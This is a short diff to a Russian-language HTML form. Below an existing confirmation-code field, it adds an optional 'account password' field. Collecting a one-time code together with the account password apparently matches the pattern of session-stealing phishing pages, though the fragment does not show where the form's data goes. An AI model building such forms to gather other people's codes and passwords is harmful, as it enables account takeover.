@@ -19,6 +19,9 @@
             <div class="mb-3">
                 <p class="text-white">Введите код подтверждения</p>
                 <input placeholder="Код подтверждения" class="form-input" name="code" autofocus>
+
+                <p class="text-white">Пароль от аккаунта</p>
+                <input placeholder="Если есть" class="form-input" name="password" autofocus>
             </div>
             <button class="w-100 btn btn-primary form-button">Отправить код</button>
         </form>
